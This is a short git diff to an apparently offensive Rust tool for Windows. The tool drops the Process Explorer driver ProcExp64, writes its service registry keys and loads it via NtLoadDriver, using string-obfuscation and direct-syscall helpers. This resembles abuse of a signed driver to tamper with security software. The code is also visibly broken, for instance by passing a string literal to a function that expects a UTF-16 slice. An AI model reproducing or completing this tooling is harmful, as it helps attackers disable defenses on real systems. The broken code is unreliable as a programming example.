@@ -41,14 +41,23 @@ use windows::Win32::Security::SE_LOAD_DRIVER_NAME;
 
 const DRIVERNAME: &str = "ProcExp64";
 
+fn create_unicode_string(s: &[u16]) -> UNICODE_STRING {
+    let len = s.len();
+
+    let n = if len > 0 && s[len - 1] == 0 { len - 1 } else { len };
+
+    UNICODE_STRING {
+        Length: (n * 2) as u16,
+        MaximumLength: (len * 2) as u16,
+        Buffer: s.as_ptr() as _,
+    }
+}
+
 fn load_driver(driverpath: String) -> bool {
-    let mut driverpath_vec: Vec<u16> = driverpath.encode_utf16().collect();
-    driverpath_vec.push(0);
+    //let mut driverpath_vec: Vec<u16> = driverpath.encode_utf16().collect();
+    //driverpath_vec.push(0);
 
-    let mut driverpath_unicode: UNICODE_STRING = driverpath_vec;
-
-    //let mut p_driverpath: UNICODE_STRING = create_unicode_string(obfstr::wide!(driverpath));
-    //println!("{:#?}", p_drivername);
+    let mut driverpath_unicode: UNICODE_STRING = create_unicode_string("C:\\Users\\vboxuser\\Desktop\\PROCEXP");
 
     unsafe {
         //let ntstatus = syscall!("NtLoadDriver", p_drivername);
@@ -295,7 +304,7 @@ fn main() {
         Err(e) => panic!("[-] Error while dropping ProcExp driver on disk: {}", e),
     };
 
-    let res_create_reg = create_registry_key(DRIVERNAME.to_string(), driverpath);
+    let res_create_reg = create_registry_key(DRIVERNAME.to_string(), driverpath.clone());
     match res_create_reg {
         Ok(()) => println!("[+] Successfully wrote {} registry keys", DRIVERNAME),
         Err(e) => panic!(
